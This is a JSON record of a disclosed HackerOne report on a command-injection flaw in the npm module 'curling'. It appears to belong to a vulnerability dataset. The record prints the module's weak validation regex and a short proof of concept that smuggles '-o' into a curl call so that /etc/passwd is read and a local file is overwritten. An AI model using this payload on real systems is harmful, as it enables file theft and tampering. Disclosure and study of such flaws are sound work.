{
  "reported_to": "Node.js third-party modules",
  "reported_by": "solov9ev ",
  "title": "[curling] Remote Code Execution",
  "content": "\nI would like to report RCE in curling\nI can bypass the security check for special characters, read / overwrite file\nModule\nmodule name: curling\nversion: 1.1.0\nnpm page: https://www.npmjs.com/package/curling\nModule Description\nA node wrapper for curl with a very simple api.\nModule Stats\n[156] weekly downloads\nVulnerability\nVulnerability Description\nThe regular expression does not perform proper validation and, when combined with curl, leads to disastrous consequences:\nCode 27 Bytes\n1/[`$&{}[;|]/g.test(command)\nSteps To Reproduce:\nRun npm i curling\nCreate and run the following POC index.js:\nCode 129 Bytes\n1const curling = require('curling');\n2\n3curling.run('file:///etc/passwd -o ./index.js', function(d, payload){console.log(payload)});\nThe exploit worked and overwritten the file - index.js\nPatch\nRegular expression needs improvement\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nCommand Injection on curling module via insecure command\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1610631600,
  "report_url": "https://hackerone.com/reports/973386",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the curling module: npm i curling"
    ],
    [
      2,
      "Create and run the following POC index.js:\nconst curling = require('curling');\ncurling.run('file:///etc/passwd -o ./index.js', function(d, payload){console.log(payload)});"
    ]
  ],
  "vuln_description": "The curling module's regular expression does not properly validate input, allowing command injection via curl. This can be exploited to read or overwrite files on the system.",
  "reason": "The vulnerability involves a straightforward bypass of input validation and exploitation of curl's capabilities. The attack does not require complex interactions or state manipulation.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection via insecure command validation in the 'curling' module, which is not related to authentication or authorization boundaries within an application. The proposed methodologies focus on detecting authN/authZ issues like IDOR or AuthN/AuthZ bypasses by manipulating user sessions and resource IDs, which are not applicable here.",
    "is_detectable": false
  }
}